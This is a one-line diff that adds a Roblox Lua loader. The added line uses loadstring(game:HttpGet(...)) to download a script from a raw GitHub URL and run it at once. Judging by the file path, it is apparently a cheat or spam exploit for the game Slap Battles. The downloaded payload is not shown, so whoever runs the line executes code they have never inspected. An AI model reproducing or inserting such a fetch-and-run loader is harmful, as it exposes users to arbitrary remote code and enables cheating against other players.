@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/update-slap-battles-spam0-2okp7ca9oc7mpf.lua"))()
